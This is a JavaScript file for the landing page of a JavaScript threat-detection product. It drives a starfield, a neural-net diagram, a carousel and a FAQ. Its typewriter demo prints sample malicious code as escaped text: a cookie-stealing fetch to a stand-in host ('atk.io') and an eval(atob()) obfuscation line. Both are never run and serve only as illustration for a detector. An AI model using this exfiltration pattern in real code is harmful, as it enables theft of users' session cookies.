/* ═══════════════════════════════════════════════════════
   JSTD.AI — Main Script
   Starfield · Neural Net Diagram · Typewriter · Carousel
   Counters · Entropy Bars · Intersection Animations
══════════════════════════════════════════════════════ */

'use strict';

/* ── UTILS ─────────────────────────────────────── */
const qs = (s, r = document) => r.querySelector(s);
const qsa = (s, r = document) => [...r.querySelectorAll(s)];
const raf = requestAnimationFrame;

/* ══════════════════════════════════════════════════
   1. STARFIELD
══════════════════════════════════════════════════ */
(function initStarfield() {
    const canvas = qs('#starfield');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    let W, H, stars = [];

    const STAR_COUNT = 220;
    const NEBULA_COLORS = [
        'rgba(0,212,255,',
        'rgba(167,139,250,',
        'rgba(0,255,136,',
        'rgba(255,51,102,',
    ];

    function resize() {
        W = canvas.width = window.innerWidth;
        H = canvas.height = window.innerHeight;
    }

    function createStar() {
        return {
            x: Math.random() * W,
            y: Math.random() * H,
            r: Math.random() * 1.2 + 0.2,
            alpha: Math.random() * 0.7 + 0.1,
            speed: Math.random() * 0.12 + 0.02,
            twinkle: Math.random() * Math.PI * 2,
            twinkleSpeed: 0.005 + Math.random() * 0.012,
        };
    }

    let nebulaBlobs = [];

    function initBlobs() {
        nebulaBlobs = Array.from({ length: 4 }, (_, i) => ({
            x: Math.random() * W,
            y: Math.random() * H,
            r: 180 + Math.random() * 220,
            color: NEBULA_COLORS[i % NEBULA_COLORS.length],
            alpha: 0.018 + Math.random() * 0.024,
        }));
        cacheGradients();
    }

    function cacheGradients() {
        nebulaBlobs.forEach(b => {
            const g = ctx.createRadialGradient(b.x, b.y, 0, b.x, b.y, b.r);
            g.addColorStop(0, b.color + b.alpha + ')');
            g.addColorStop(0.5, b.color + (b.alpha * 0.4) + ')');
            g.addColorStop(1, b.color + '0)');
            b.cachedGrad = g;
        });
    }

    function init() {
        resize();
        stars = Array.from({ length: STAR_COUNT }, createStar);
        initBlobs();
    }

    function draw(ts = 0) {
        if (document.hidden) return;
        ctx.clearRect(0, 0, W, H);

        // nebula blobs (gradients pre-cached in init)
        nebulaBlobs.forEach(b => {
            ctx.fillStyle = b.cachedGrad;
            ctx.beginPath();
            ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2);
            ctx.fill();
        });

        // stars
        stars.forEach(s => {
            s.twinkle += s.twinkleSpeed;
            const a = s.alpha * (0.6 + 0.4 * Math.sin(s.twinkle));
            s.y -= s.speed;
            if (s.y < -2) {
                s.y = H + 2;
                s.x = Math.random() * W;
            }

            ctx.beginPath();
            ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(200,220,255,${a})`;
            ctx.fill();
        });

        // grid scanline
        const scanY = (ts * 0.04) % H;
        const scanGrad = ctx.createLinearGradient(0, scanY - 80, 0, scanY + 80);
        scanGrad.addColorStop(0, 'transparent');
        scanGrad.addColorStop(0.5, 'rgba(0,212,255,0.012)');
        scanGrad.addColorStop(1, 'transparent');
        ctx.fillStyle = scanGrad;
        ctx.fillRect(0, scanY - 80, W, 160);

        raf(draw);
    }

    init();
    draw();
    let resizeTimer;
    window.addEventListener('resize', () => {
        clearTimeout(resizeTimer);
        resizeTimer = setTimeout(() => { resize(); cacheGradients(); }, 150);
    });
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) raf(draw);
    });
})();


/* ══════════════════════════════════════════════════
   2. CRACK LINE — inject .crack-line span into .cracked-word
══════════════════════════════════════════════════ */
qsa('.cracked-word').forEach(el => {
    const line = document.createElement('span');
    line.className = 'crack-line';
    el.appendChild(line);
});


/* ══════════════════════════════════════════════════
   3. HERO CODE TYPEWRITER
══════════════════════════════════════════════════ */
(function initTypewriter() {
    const el = qs('#heroCode');
    if (!el) return;

    const lines = [
        { txt: '// HIGH: Cookie stealing with fetch', cls: 'c-comment' },
        { txt: 'function stealCookies() {', cls: 'c-kw' },
        { txt: '  const c = document.cookie;', cls: null },
        { txt: "  fetch('https://atk.io/c', {", cls: 'c-fn' },
        { txt: "    method: 'POST',", cls: null },
        { txt: '    body: JSON.stringify({ c })', cls: null },
        { txt: '  });', cls: null },
        { txt: '}', cls: null },
        { txt: '// Base64 + eval combo', cls: 'c-comment' },
        { txt: "const enc = 'dmFy..xZA==';", cls: 'c-str' },
        { txt: 'eval(atob(enc));', cls: 'c-fn' },
    ];

    let lineIdx = 0,
        charIdx = 0;
    let fullText = '';

    function tick() {
        if (lineIdx >= lines.length) {
            setTimeout(() => {
                el.innerHTML = '';
                fullText = '';
                lineIdx = 0;
                charIdx = 0;
                tick();
            }, 3200);
            return;
        }

        const line = lines[lineIdx];
        if (charIdx <= line.txt.length) {
            const partial = line.txt.slice(0, charIdx);
            const cls = line.cls ? ` class="${line.cls}"` : '';
            const lineHtml = cls ?
                `<span${cls}>${escHtml(partial)}<span class="cursor">▌</span></span>` :
                escHtml(partial) + '<span class="cursor">▌</span>';

            el.innerHTML = fullText + lineHtml;
            charIdx++;
            setTimeout(tick, 32 + Math.random() * 28);
        } else {
            const cls = line.cls ? ` class="${line.cls}"` : '';
            fullText += cls ?
                `<span${cls}>${escHtml(line.txt)}</span>\n` :
                escHtml(line.txt) + '\n';
            lineIdx++;
            charIdx = 0;
            setTimeout(tick, 80);
        }
    }

    function escHtml(s) {
        return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    setTimeout(tick, 600);
})();


/* ══════════════════════════════════════════════════
   4. NEURAL NETWORK CANVAS DIAGRAM
══════════════════════════════════════════════════ */
(function initNNDiagram() {
    const c1 = qs('#nnCanvas');
    const c2 = qs('#nnCanvas2');
    if (!c1 || !c2) return;

    const DPR = 1.5;

    function scaleCanvas(c) {
        const lw = c.width,
            lh = c.height;
        c.style.width = lw + 'px';
        c.style.height = lh + 'px';
        c.width = Math.round(lw * DPR);
        c.height = Math.round(lh * DPR);
        return { lw, lh };
    }

    const s1 = scaleCanvas(c1);
    const s2 = scaleCanvas(c2);

    // Canvas 1: Input (visual subset, 8 nodes) → Hidden (8 nodes)
    drawNNLayer(c1, s1.lw, s1.lh, {
        left: { n: 8, color: '#00d4ff', label: '50' },
        right: { n: 8, color: '#a78bfa', label: '30' },
        connColor: 'rgba(0,212,255,0.06)',
        activeConn: 'rgba(0,212,255,0.35)',
    });

    // Canvas 2: Hidden (6 nodes) → Output (1 node)
    drawNNLayer(c2, s2.lw, s2.lh, {
        left: { n: 6, color: '#a78bfa', label: '30' },
        right: { n: 1, color: '#00ff88', label: '1' },
        connColor: 'rgba(167,139,250,0.1)',
        activeConn: 'rgba(0,255,136,0.6)',
    });

    function drawNNLayer(canvas, logW, logH, { left, right, connColor, activeConn }) {
        const ctx = canvas.getContext('2d');
        const W = logW,
            H = logH;
        const pad = 32;

        const leftX = pad + 8;
        const rightX = W - pad - 8;

        function yPos(i, n) {
            const spacing = (H - pad * 2) / (n + 1);
            return pad + spacing * (i + 1);
        }

        function drawNodes(x, n, color) {
            for (let i = 0; i < n; i++) {
                const y = yPos(i, n);
                ctx.beginPath();
                ctx.arc(x, y, 6, 0, Math.PI * 2);
                ctx.fillStyle = color + '22';
                ctx.strokeStyle = color;
                ctx.lineWidth = 1.2;
                ctx.fill();
                ctx.stroke();
            }
        }

        function drawConnections(animated) {
            for (let i = 0; i < left.n; i++) {
                for (let j = 0; j < right.n; j++) {
                    const x1 = leftX + 6;
                    const y1 = yPos(i, left.n);
                    const x2 = rightX - 6;
                    const y2 = yPos(j, right.n);

                    const isActive = animated && (i + j) % 3 === (Math.floor(Date.now() / 400) % 3);

                    ctx.beginPath();
                    ctx.moveTo(x1, y1);
                    ctx.lineTo(x2, y2);
                    ctx.strokeStyle = isActive ? activeConn : connColor;
                    ctx.lineWidth = isActive ? 1.2 : 0.8;
                    ctx.stroke();
                }
            }
        }

        function frame() {
            if (document.hidden) return;
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.save();
            ctx.scale(DPR, DPR);
            drawConnections(true);
            drawNodes(leftX, left.n, left.color);
            drawNodes(rightX, right.n, right.color);
            ctx.restore();
            raf(frame);
        }

        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) raf(frame);
        });

        frame();
    }
})();


/* ══════════════════════════════════════════════════
   5. INTERSECTION OBSERVER — fade-in + trigger anims
══════════════════════════════════════════════════ */
(function initObserver() {
    const fadeEls = qsa([
        '.section__label',
        '.section__title',
        '.section__desc',
        '.pipeline__step',
        '.algo-card',
        '.tcard',
        '.showcase-item',
        '.docs-card',
        '.docs-qs-step',
    ].join(','));

    const fadeObs = new IntersectionObserver((entries) => {
        entries.forEach(e => {
            if (e.isIntersecting) {
                e.target.classList.add('is-visible');
                fadeObs.unobserve(e.target);
            }
        });
    }, { threshold: 0.12 });

    fadeEls.forEach(el => fadeObs.observe(el));

    // Trigger entropy bar animation on view
    const entropyObs = new IntersectionObserver((entries) => {
        entries.forEach(e => {
            if (e.isIntersecting) {
                qsa('.entropy-fill', e.target).forEach(bar => {
                    const target = bar.style.width;
                    bar.style.width = '0';
                    requestAnimationFrame(() => {
                        requestAnimationFrame(() => { bar.style.width = target; });
                    });
                });
                entropyObs.unobserve(e.target);
            }
        });
    }, { threshold: 0.2 });

    const entropySection = qs('.entropy-visual');
    if (entropySection) entropyObs.observe(entropySection.closest('.algo-card'));

    // Threat card bar
    const barFill = qs('.threat-card__bar-fill');
    if (barFill) {
        const barObs = new IntersectionObserver(entries => {
            entries.forEach(e => {
                if (e.isIntersecting) {
                    barFill.style.width = barFill.dataset.width || barFill.style.width;
                    barObs.unobserve(e.target);
                }
            });
        }, { threshold: 0.5 });
        barObs.observe(barFill.closest('.threat-card') || document.body);
    }
})();


/* ══════════════════════════════════════════════════
   6. ANIMATED STAT COUNTERS
══════════════════════════════════════════════════ */
(function initCounters() {
    const counters = qsa('[data-count]');
    if (!counters.length) return;

    const obs = new IntersectionObserver(entries => {
        entries.forEach(e => {
            if (!e.isIntersecting) return;
            const el = e.target;
            const target = parseFloat(el.dataset.count);
            const isFloat = String(target).includes('.');
            const duration = 1400;
            const start = performance.now();

            function step(now) {
                const progress = Math.min((now - start) / duration, 1);
                const ease = 1 - Math.pow(1 - progress, 3);
                const val = target * ease;
                el.textContent = isFloat ? val.toFixed(1) : Math.round(val).toLocaleString('ru');
                if (progress < 1) raf(step);
            }

            raf(step);
            obs.unobserve(el);
        });
    }, { threshold: 0.5 });

    counters.forEach(c => obs.observe(c));
})();


/* ══════════════════════════════════════════════════
   7. TESTIMONIALS CAROUSEL
══════════════════════════════════════════════════ */
(function initTestimonials() {
    const wrapper = qs('.testimonials');
    const track = qs('#testimonialsTrack');
    const prevBtn = qs('#tPrev');
    const nextBtn = qs('#tNext');
    const dotsWrap = qs('#tDots');
    if (!track || !wrapper) return;

    const cards = qsa('.tcard', track);
    let current = 0;
    let autoTimer;

    function getPerView() {
        const w = window.innerWidth;
        if (w <= 768) return 1;
        if (w <= 1024) return 2;
        return 3;
    }

    function getTotal() {
        return Math.ceil(cards.length / getPerView());
    }

    // Measure wrapper, set explicit pixel widths on every card so %/flex
    // math doesn't depend on track's own size
    function applyCardSizes() {
        const pv = getPerView();
        const gap = 24;
        const wrapW = wrapper.offsetWidth;
        const cardW = Math.floor((wrapW - gap * (pv - 1)) / pv);
        cards.forEach(c => {
            c.style.width = cardW + 'px';
            c.style.minWidth = cardW + 'px';
        });
        return { cardW, gap };
    }

    function buildDots() {
        if (!dotsWrap) return;
        dotsWrap.innerHTML = '';
        const total = getTotal();
        for (let i = 0; i < total; i++) {
            const d = document.createElement('button');
            d.className = 't-dot' + (i === current ? ' active' : '');
            d.setAttribute('aria-label', 'Слайд ' + (i + 1));
            d.addEventListener('click', () => goTo(i));
            dotsWrap.appendChild(d);
        }
    }

    function goTo(idx) {
        const total = getTotal();
        current = Math.max(0, Math.min(idx, total - 1));
        const pv = getPerView();
        const { cardW, gap } = applyCardSizes();
        const offset = current * pv * (cardW + gap);
        track.style.transition = 'transform .5s cubic-bezier(.4,0,.2,1)';
        track.style.transform = `translateX(-${offset}px)`;
        qsa('.t-dot', dotsWrap).forEach((d, i) => d.classList.toggle('active', i === current));
    }

    function next() { goTo(current + 1 < getTotal() ? current + 1 : 0); }

    function prev() { goTo(current - 1 >= 0 ? current - 1 : getTotal() - 1); }

    function startAuto() { autoTimer = setInterval(next, 5000); }

    function stopAuto() { clearInterval(autoTimer); }

    if (nextBtn) nextBtn.addEventListener('click', () => {
        stopAuto();
        next();
        startAuto();
    });
    if (prevBtn) prevBtn.addEventListener('click', () => {
        stopAuto();
        prev();
        startAuto();
    });

    // pause autoplay while cursor is over any tcard
    track.addEventListener('mouseenter', stopAuto);
    track.addEventListener('mouseleave', startAuto);

    // swipe
    let startX = 0;
    track.addEventListener('pointerdown', e => { startX = e.clientX; });
    track.addEventListener('pointerup', e => {
        const dx = e.clientX - startX;
        if (Math.abs(dx) > 40) {
            stopAuto();
            dx < 0 ? next() : prev();
            startAuto();
        }
    });

    // keyboard
    document.addEventListener('keydown', e => {
        if (e.key === 'ArrowRight') {
            stopAuto();
            next();
            startAuto();
        }
        if (e.key === 'ArrowLeft') {
            stopAuto();
            prev();
            startAuto();
        }
    });

    window.addEventListener('resize', () => {
        applyCardSizes();
        buildDots();
        goTo(0);
    });

    applyCardSizes();
    buildDots();
    goTo(0);
    startAuto();
})();


/* ══════════════════════════════════════════════════
   8. NAV MOBILE BURGER
══════════════════════════════════════════════════ */
(function initBurger() {
    const burger = qs('#navBurger');
    const links = qs('.nav__links');
    if (!burger || !links) return;

    burger.addEventListener('click', () => {
        const open = links.style.display === 'flex';
        links.style.display = open ? '' : 'flex';
        links.style.flexDirection = 'column';
        links.style.position = 'absolute';
        links.style.top = '64px';
        links.style.left = '0';
        links.style.right = '0';
        links.style.background = 'rgba(6,9,17,.97)';
        links.style.borderBottom = '1px solid rgba(0,212,255,.14)';
        links.style.padding = '16px 32px';
        if (open) links.removeAttribute('style');
    });
})();


/* ══════════════════════════════════════════════════
   9. NAV ACTIVE LINK ON SCROLL
══════════════════════════════════════════════════ */
(function initNavHighlight() {
    const sections = qsa('section[id]');
    const navLinks = qsa('.nav__links a[href^="#"]');

    const obs = new IntersectionObserver(entries => {
        entries.forEach(e => {
            if (!e.isIntersecting) return;
            navLinks.forEach(a => {
                a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id);
            });
        });
    }, { rootMargin: '-40% 0px -55% 0px' });

    sections.forEach(s => obs.observe(s));
})();


/* ══════════════════════════════════════════════════
   10. THREAT CARD BAR — delayed reveal on load
══════════════════════════════════════════════════ */
(function initHeroBar() {
    const fill = qs('.threat-card__bar-fill');
    if (!fill) return;
    // Already animated via CSS transition-delay, just ensure it fires
    setTimeout(() => {
        fill.style.width = fill.style.width || '93.46%';
    }, 800);
})();


/* ══════════════════════════════════════════════════
   11. SMOOTH PARALLAX on hero grid overlay
══════════════════════════════════════════════════ */
(function initParallax() {
    const overlay = qs('.hero__grid-overlay');
    if (!overlay || window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

    document.addEventListener('mousemove', e => {
        const dx = (e.clientX / window.innerWidth - 0.5) * 12;
        const dy = (e.clientY / window.innerHeight - 0.5) * 8;
        overlay.style.transform = `translate(${dx}px, ${dy}px)`;
    });
})();


/* ══════════════════════════════════════════════════
   12. FEATURE BARS RESET+ANIMATE on view
══════════════════════════════════════════════════ */
(function initFeatureBars() {
    const section = qs('.features-visual');
    if (!section) return;

    const obs = new IntersectionObserver(entries => {
        entries.forEach(e => {
            if (!e.isIntersecting) return;
            qsa('.feat-bar__fill', e.target).forEach(bar => {
                bar.style.animation = 'none';
                void bar.offsetWidth;
                bar.style.animation = '';
            });
            obs.unobserve(e.target);
        });
    }, { threshold: 0.3 });

    obs.observe(section.closest('.algo-card'));
})();


/* ══════════════════════════════════════════════════
   13. FAQ ACCORDION
══════════════════════════════════════════════════ */
(function initFAQ() {
    const list = qs('#faqList');
    if (!list) return;

    list.addEventListener('click', e => {
        const btn = e.target.closest('.faq-item__q');
        if (!btn) return;

        const item = btn.closest('.faq-item');
        const isOpen = item.classList.contains('faq-item--open');

        // close all
        qsa('.faq-item--open', list).forEach(el => {
            el.classList.remove('faq-item--open');
            el.querySelector('.faq-item__q').setAttribute('aria-expanded', 'false');
        });

        // open clicked if it was closed
        if (!isOpen) {
            item.classList.add('faq-item--open');
            btn.setAttribute('aria-expanded', 'true');
        }
    });
})();